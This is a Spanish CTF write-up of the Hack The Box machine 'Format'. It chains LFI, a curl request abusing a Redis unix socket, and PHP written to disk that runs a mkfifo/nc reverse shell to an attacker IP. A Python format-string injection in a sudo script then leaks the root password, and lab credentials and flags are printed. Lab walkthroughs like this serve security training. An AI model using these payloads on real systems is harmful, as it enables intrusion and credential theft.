---
layout: post
title: Format
date: 2023-09-30
description:
img:
fig-caption:
tags: [OSCP, eWPT, eWPTXv2]
---
___

<center><img src="/writeups/assets/img/Format-htb/Format.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* LFI

* Análisis de código fuente

* Abuso de Unix Socket File - Modificación atributos en redis para settear una flag verdadera

* Arbitrary File Upload

* Enumeración Redis

* Abuso de privilegio a nivel de sudoers (Escalada de Privilegios)


***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.213 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 07:30 GMT
Nmap scan report for 10.10.11.213
Host is up (0.057s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,3000 10.10.11.213 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 07:30 GMT
Nmap scan report for 10.10.11.213
Host is up (0.071s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
|_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
3000/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds
```

Añado el dominio ```microblog.htb``` al ```/etc/hosts```

## Puerto 80,3000 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.213
http://10.10.11.213 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.213], Meta-Refresh-Redirect[http://app.microblog.htb], nginx[1.18.0]
ERROR Opening: http://app.microblog.htb - no address for app.microblog.htb
```

Añado el subdominio ```app.microblog.htb``` al ```/etc/hosts```

```null
whatweb http://10.10.11.213
http://10.10.11.213 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.213], Meta-Refresh-Redirect[http://app.microblog.htb], nginx[1.18.0]
http://app.microblog.htb [200 OK] Cookies[username], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.213], JQuery, Script, Title[Microblog], nginx[1.18.0]
```

Se ve así:

<img src="/writeups/assets/img/Format-htb/1.png" alt="">

Lo mismo para el puerto ```3000```

```null
whatweb http://10.10.11.213:3000
http://10.10.11.213:3000 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.213], RedirectLocation[http://microblog.htb:3000/], Title[301 Moved Permanently], nginx[1.18.0]
http://microblog.htb:3000/ [200 OK] Cookies[_csrf,i_like_gitea,macaron_flash], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[_csrf,i_like_gitea,macaron_flash], IP[10.10.11.213], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Microblog], X-Frame-Options[SAMEORIGIN], nginx[1.18.0]
```

<img src="/writeups/assets/img/Format-htb/2.png" alt="">

Me registro en el aplicativo

<img src="/writeups/assets/img/Format-htb/3.png" alt="">

Creo un nuevo blog

<img src="/writeups/assets/img/Format-htb/4.png" alt="">

Añado el subdominio ```rubbx.microblog.htb``` al ```/etc/hosts```. Al editar la web, intercepto la petición con ```BurpSuite```. El parámetro ```id``` por POST es vulenrable a LFI

```null
POST /edit/index.php HTTP/1.1
Host: rubbx.microblog.htb
Content-Length: 37
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://rubbx.microblog.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://rubbx.microblog.htb/edit/?message=Section%20added!&status=success
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: username=8f18kueulgjqjb9dbljbuaovpd
Connection: close

id=../../../../etc/passwd&header=
```

<img src="/writeups/assets/img/Format-htb/5.png" alt="">

En la página principal se puede ver un enlace que lleva a un repositorio ```Git``` alojado en el puerto 3000

<img src="/writeups/assets/img/Format-htb/6.png" alt="">

Lo clono para analizar su código

```null
git clone http://microblog.htb:3000/cooper/microblog
```

En el ```index.php``` se puede ver la función ```isPro```

```null
function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}
```

Se está estableciendo una conexión al ```redis```. En otro archivo aparece una función que permite subir archivos al servidor en caso de que ```isPro``` sea verdadero

```null
function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}
```

Puedo conectarme al ```Unix Socket File``` mediante el método ```HSET``` para modificar el atributo y convertirme en usuario privilegiado

```null
curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:rubbx%20pro%20true%20a/b
```

Al recargar, aparece una insignia en la parte superior derecha

<img src="/writeups/assets/img/Format-htb/7.png" alt="">

Intercepto de nuevo la petición al editar la web. En el parámetro ```id``` introduzco la ruta donde voy a depositar el contenido PHP para enviarme la reverse shell

```null
id=/var/www/microblog/rubbx/uploads/pwned.php&header=<%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.16.40+443+>/tmp/f")%3b+%3f>
```

Cargo la página a través de una petición por GET

```null
curl -s -X GET ```http://rubbx.microblog.htb/uploads/pwned.php```
```

Recibo la conexión en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.40] from (UNKNOWN) [10.10.11.213] 42070
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@format:~/microblog/rubbx/uploads$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@format:~/microblog/rubbx/uploads$ export TERM=xterm
www-data@format:~/microblog/rubbx/uploads$ export SHELL=bash
www-data@format:~/microblog/rubbx/uploads$ stty rows 55 columns 209
```

Me conecto al servicio del ```redis``` y listo las ```KEYS```

```null
www-data@format:/tmp$ redis-cli -s /run/redis/redis.sock 
redis /run/redis/redis.sock> KEYS *
 1) "rubbx"
 2) "PHPREDIS_SESSION:admin"
 3) "PHPREDIS_SESSION:4djgijeqgnfeohsl2echr12g56"
 4) "cooper.dooper"
 5) "PHPREDIS_SESSION:u44up1ppmb76sdm93gqah49qhv"
 6) "PHPREDIS_SESSION:ddjirut3hkjs0n9m3ivveuhcn5"
 7) "PHPREDIS_SESSION:k2sgkup2l238ve7njekgtdoti3"
 8) "PHPREDIS_SESSION:jfbt3kj53f59hf2lfamb1gfgsg"
 9) "cooper.dooper:sites"
10) "PHPREDIS_SESSION:8f18kueulgjqjb9dbljbuaovpd"
11) "rubbx:sites"
12) "PHPREDIS_SESSION:2k9fth661f9141db3c969c1les"
13) "PHPREDIS_SESSION:ricua5lum706b03to5kt263mfj"
```

Listo los campos para ```cooper.dooper```

```null
redis /run/redis/redis.sock> HGETALL cooper.dooper
 1) "username"
 2) "cooper.dooper"
 3) "password"
 4) "zooperdoopercooper"
 5) "first-name"
 6) "Cooper"
 7) "last-name"
 8) "Dooper"
 9) "pro"
10) "false"
```

Su contraseña aparece en el cuarto. Puedo ver la primera flag

```null
www-data@format:/tmp$ su cooper
Password: 
cooper@format:/tmp$ cd
cooper@format:~$ cat user.txt 
a041a3b0af5dfc13d0b64e3f2dfdcaef
```

# Escalada

Tengo un privilegio a nivel de ```sudoers```

```null
cooper@format:~$ sudo -l
[sudo] password for cooper: 
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
```

No tengo capacidad de escritura

```null
cooper@format:~$ ls -l /usr/bin/license 
-rwxr-xr-x 1 root root 3519 Nov  3  2022 /usr/bin/license
```

Se trata de un script de ```python```

```null
cooper@format:~$ file /usr/bin/license 
/usr/bin/license: Python script, ASCII text executable
```

```null
cooper@format:~$ cat /usr/bin/license 
#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")
```

Se puede abusar de el formato de cadena. En este [artículo](https://podalirius.net/en/articles/python-format-string-vulnerabilities/) está detallado. Desde el ```redis```, modifico mi nombre de usuario

```null
cooper@format:~$ redis-cli -s /var/run/redis/redis.sock 
redis /var/run/redis/redis.sock> hset rubbx username {license.__init__.__globals__}
(integer) 0
```

Al volver a ejecutar, se genera un error donde se leakean datos

{%raw%}
```null
ooper@format:~$ sudo license -p rubbx

Plaintext license key:
------------------------------------------------------
microblog{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fdff1e84c70>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/usr/bin/license', '__cached__': None, 'base64': <module 'base64' from '/usr/lib/python3.9/base64.py'>, 'default_backend': <function default_backend at 0x7fdff1cd7430>, 'hashes': <module 'cryptography.hazmat.primitives.hashes' from '/usr/local/lib/python3.9/dist-packages/cryptography/hazmat/primitives/hashes.py'>, 'PBKDF2HMAC': <class 'cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC'>, 'Fernet': <class 'cryptography.fernet.Fernet'>, 'random': <module 'random' from '/usr/lib/python3.9/random.py'>, 'string': <module 'string' from '/usr/lib/python3.9/string.py'>, 'date': <class 'datetime.date'>, 'redis': <module 'redis' from '/usr/local/lib/python3.9/dist-packages/redis/__init__.py'>, 'argparse': <module 'argparse' from '/usr/lib/python3.9/argparse.py'>, 'os': <module 'os' from '/usr/lib/python3.9/os.py'>, 'sys': <module 'sys' (built-in)>, 'License': <class '__main__.License'>, 'parser': ArgumentParser(prog='license', usage=None, description='Microblog license key manager', formatter_class=<class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True), 'group': <argparse._MutuallyExclusiveGroup object at 0x7fdff087d820>, 'args': Namespace(provision='rubbx', deprovision=None, check=None), 'r': Redis<ConnectionPool<UnixDomainSocketConnection<path=/var/run/redis/redis.sock,db=0>>>, '__warningregistry__': {'version': 0}, 'secret': 'unCR4ckaBL3Pa$$w0rd', 'secret_encoded': b'unCR4ckaBL3Pa$$w0rd', 'salt': b'microblogsalt123', 'kdf': <cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC object at 0x7fdff087deb0>, 'encryption_key': b'nTXlHnzf-z2cR0ADCHOrYga7--k6Ii6BTUKhwmTHOjU=', 'f': <cryptography.fernet.Fernet object at 0x7fdff08a2640>, 'l': <__main__.License object at 0x7fdff08a2730>, 'user_profile': {b'username': b'{license.__init__.__globals__}', b'password': b'rubbx', b'first-name': b'rubbx', b'last-name': b'rubbx', b'pro': b'false'}, 'existing_keys': <_io.TextIOWrapper name='/root/license/keys' mode='r' encoding='UTF-8'>, 'all_keys': ['cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n'], 'user_key': 'cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n', 'prefix': 'microblog', 'username': '{license.__init__.__globals__}', 'firstlast': 'rubbxrubbx'}mU=YbrzL3D"#X(6e9{%n}9;GUw-L&vQ,^n<*Ou\orubbxrubbx

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABkbyjAFa2M5TmMX8ugcOiWEV5naEzwApo62mpjKLAM1E1-60Xz66aiOuJ521yvk-LCKmfsRRRS1nN01TtJwKlYAHqSPClngCrsVU-Jy20zVdqGqx55EKF1_2PKdm8VGlaUCfSdpakEHeO0sYYnDrumqgrNKdiedp9gW7vlEfda3JoGZZeYji7jWWafwI1lWkX2X7t0LO63_vZtk_jMcN0MyLbvfkeokvUZk-EUv2ZYMJXLlBoDNMmHPzGr2mtQkotMavPnOe7iRhRzKxRG15Da68dSh-TWoMMTXRHB70o2nyFbriO_91HCNZyf1TR9cmyUEj8G3Zz3j2yZqUJcK33I5dbKc1RcFJhmeGgR5xVJLr36g2ZmC2GzhioUYQFqqW_DPnYBeqAQc0clTVUkvOSoSIkaNOMyeVt66Mg7eyHlxgLpAgbWapU2HgqD0qUNeWLT8yMuekcf9iFdMTVzsF3T_ySd2f-VhDc9fFAjEW_p6RmAqf0psi4GiQZBpa7y515TgSiru9RdWu7OoHFcdRgT2i1LgECaHL-vjTl3Rtud-MWI2L2IyXvbZM6VTWRYL4icXAAfwTrOC_Po8TQUclBnWPJam9O7SJISTv4Q1ynYkMIioyRm4zLxT4rWSoB-fBl7maLNPEeml4rJSeapINVwnE9JIYSqmLjRnm6ELs_BwGeu32p-OtfHa4YHdoQcjG3WYl_arWoDZBoFn0jxbd84H_909AzR0OUjI2Om8M4DuJtXGgUKxmOuqC6HFek0lthCIz-6WAC7DobVQM9a-OQ6vTbPlNa6jdebOx30Il8V8cT9qxTRA3C8HtnfcFWrDemDsmAGUP7GQ1CBLHgkhf3z-lUzUZ_tUtS9UG7YNq4EfgHdRw5ga3HUuT4vr5UP7jC_RNxww5l8Q-XYiejPVtPF0uN7G_x3YwP8yhuq7AEK49cr2XvEidB6jegy9TUaPI2fgV6axSUvo8-5Qruzz-HpWPAYkVbKFX46FAjHpz_qYmmY3h79_6JfOCqmflLbnEx3mk6osjbHKEaOuj5LF06cGJD7q00FPJhPPoejQSUVlqr6NVqoXpLzGEkKTaW1HAFIe_husZtpQxyXqaoLqVQLAd1bt5I6w8tUrFo9L_nJmJ4ACs055LOsr-8AcK2AHfeGBp6cn5hKALJxnTBmGsaWuumCJ6oYXBkIK83sWwd_hLmOg_-NUfljsuDJqGoPmxZsV8wDQGQ9ycYG4FLUat30_0s0qohIE7EW8jExwdTYdRxcAs3c5UCWZhmajhmJGvuCFY5W2zZ0mIetDSK4zLpLwxDj5yRmhsKzJ1VM3mkY16ZP_Ab-RUJvsCXLWJIYXQ9HHEaYTSVfkgTfYxV_1S3O1fc31DIdx6x6QaGgS63rO-rZlCvOSPvf8-bJdeV4k_V8rnpwLKzBWsRQj5qWtJ3Zass41jBIhX7bSZcu3Gs05s6A4zOqG-HD5FFdLRmHmVOG3BDM8e839DuEeDkhu8OmxH9_LoitXYsv-78kp7tPX7o1j5kNmp65wxXkFRirKuuITd8pd8htZhYqNHsP4sVAghhoM1HrkOymLQDKygY9CvmpNwKxnjG6diltILIhsWy98qqjIIGAxcpXJqVT9SWR-dZLnireSnUdsL7S9AgW1NSCRLo-vDzYLTn42jEHLfhIJ9vsdah-TCo_nKpL25zE28Ps2SHHOMa__j7gWkN3qL74qArffLfEyzqi4-N6fWluLUmUSLs9zwuduiLq-tq-nHDRQr8sx-77Akz4e3sx90f6Y0AclpNy1uxSBJg80yfobDD0I37_c7CZ_a68z-4iTc0w3-F1NZa38Xv8dVkwSnHnNanFSv9g68LE2X4Mr927uoHHRy_TRvwuEi94FffXkMfSI2De9tPe_9l-1ovxhsY39GLrLDJlNUVcbL2TNTS5epHP8sw8SkBg1mALeUsgXegFj_1i7nEqXhrj6BvUBmu4CbXtZ00pBsPMdrPEqhiGI2jtuwDMPVQEOoczXi9Taoocbxk3H_2St9R1NGVA5oliVnAsrqL6su4r_G8CAiXlllGdS2xgqqcml6QfSyUhcDX9u4XlmJa80Oc_0RsFyuYLnd_tMn-6kI04k3KmX1LsP5JptsdQg-ZnBN5xpXvjJuCr0RE3KduA82K_lxtnABVLx45ZsanIbdjhdQMCH_22I-6xjPYkQBdc8BoN5dRuyaLX9mEC247f5aXgPH39DODGN7oEG3CdbR1VQlyqUG9H8sfYps0Fg62m1e_pLRRBMsn2fLgBpFp2dvR-Ovv5ZzIllvPqwkYIQ67-g7xqPHgbIYIBNmEiMLcaTCG-M1BStJoK1jK7eaKwbudNWFm0hc_5OgJY8wxKlzjxD2rA5IQtiNHU_A3hQ5hZvdAlmbaj6iYiTHgC-HRdnzkHfgQ9JxTZLw_4xeSRnR-PllJozU71IuEMPGZcc7hclZfkizUZ0N-Cw-zoJFe7KY-yJH_HBHxQqIsGBp-Br6x3oKUaFiNYCEr5ugkkE7L6NLaxZolIbZ-LdIOiVtVi2W_ZF76yxxGUY2TdQeoH_HP4jHaER4-V-BAaWHzi0dv7u2vGrSste9Gl0AN-oIi-zqvTwtgqwxhmJi4OpzAIMrwjyMK2IP5XwAMOa53d-MBdxEyZy2k7E73iz7y8DC2Ll0KvkevOTWUHg9b4YBUhP2Rd6Jg_-91-z-BxcpDTE4LYM1MVo-wZi7LJpp7MDl0Y_B3cpSGbMNsua11hVywxDQg0Zh-iuCXIyrFqH-NcWXEsm-CykJ2xtWyMkOe3T0WyX4o2PgbjwJwYF4ioijxUFg3WozwFp6GeWhRqhBZ272rTmxO_FGaT3_Pa4crvXvConLTsH9Ldr9XAq31T0Zkmyk5XHlZrX-02w1SlD-f8kuVLd0hDSfi9EFztBbO2q-3w4Kx6QA93c0zTEMiqg2RgDSY1nx-w6iz7JVseXt-R4UmUyox1rlrjkdIeHWCsN1pPhacu5CYzLBnOqJUu_gk33AFBt25FsO59DPHt80PVvG60uBbOyjN1el2irulUf5TOcx5fUZmCRVuDcN53xSKroZ02-QYNlHks5pvUEZh7-6Dwg-q43XjTAtpbT260uLCB9qwH9yaPvhXQxAel8Zn9D7uQQPVeJxA5QdHPMR0eNGBCfYJtpej2BkdndMvvEgVB1PiCPlKZmQf8WAQkF28J4an_08lIQpFu1urYfxY_yfzYwPn1pVwdFrN42vrmHz5eVVsX_5K1tHGSRea9Ud03htDiHyCgYvq9QeND-kTh_FQv5OFweQcFJ91ijCI2rZyioOxzh56WbQbvIUoA09qCC3gNuK2kHEpSu5UsMgQlP0FeF2PzBnI8xXXyvczbTbqrrpfi-UANKAcL3tGnJJ8XYkbUMbbuJAt2c97X9Uakd22AFNauBn8L0VWKDdyvsIDKiCz1EhGKVecOpv7t2AG4Re64YqJvilELvtb8SbTDoDo9ZescbGzrXPqoR_y3NfuIWoY2IEQYx64-idYAYCJl2yElFh3gjlA0CF-DGFm-rHrbq7NTYhVFG06L5DOOCI0NoiFjN2jE8aEf-JAAem39oUiddYbZ2IpvmpVAaHHWg1kMdAVtE3a8NPgWaX576suoknoX2kQojZksV-h0Ugy5KjaPinBkj-hZBWDr9wudVQcir7jsr-lcM6M0VemsazqKSEmnAb75QcY1Zt1O6FZnzXPHDkuyPwZWWy5kz-aM90TabNa5wAnTa4rUTAbGSWa_Y1LbnjYDfBpVwVTl4KdYwuU7Hy0H3bz5ql3YWX2cmFREZE2DlzTcHjzpu_0xnRZwmvXuIH_rLnqLy2U=
```
{%endraw%}

La contraseña para ```root``` es ```unCR4ckaBL3Pa$$w0rd```. Puedo ver la segunda flag

```null
cooper@format:~$ su root
Password: 
root@format:/home/cooper# cat /root/root.txt 
010865b6178c43aafe71bbb559ebe385
```